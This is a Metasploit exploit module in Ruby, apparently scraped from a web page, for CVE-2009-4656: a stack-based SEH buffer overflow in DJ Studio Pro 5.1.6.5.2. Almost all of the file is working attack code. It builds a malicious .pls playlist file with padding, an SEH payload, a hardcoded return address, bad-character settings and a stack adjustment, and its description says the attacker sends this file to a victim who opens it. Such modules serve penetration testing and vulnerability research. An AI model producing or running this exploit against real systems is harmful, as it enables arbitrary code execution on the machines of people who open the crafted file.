# $Id$
##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;DJ Studio Pro 5.1.6.5.2 SEH Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2.
                An attacker must send the file to victim and the victim must open the file.
                Alternatively it may be possible to execute code remotely via an embedded
                PLS file within a browser, when the PLS extention is registered to DJ Studio Pro.
                This functionality has not been tested in this module.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;     =>
                [
                    &#039;Sebastien Duquette&#039;,
                    &#039;Death-Shadow-Dark <death.shadow.dark@gmail.com>&#039;,
                ],
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-4656&#039;],
                    [ &#039;OSVDB&#039;, &#039;58159&#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10827&#039; ],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 5000,
                    &#039;BadChars&#039; => "\x00\x0a\x3d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x014FC62D } ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Dec 30 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.pls&#039;]),
                ], self.class)
    end
    def exploit
        sploit = rand_text_alpha_upper(1308)
        sploit << generate_seh_payload(target.ret)
        sploit << rand_text_alpha_upper(10000)
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(sploit)
    end
end



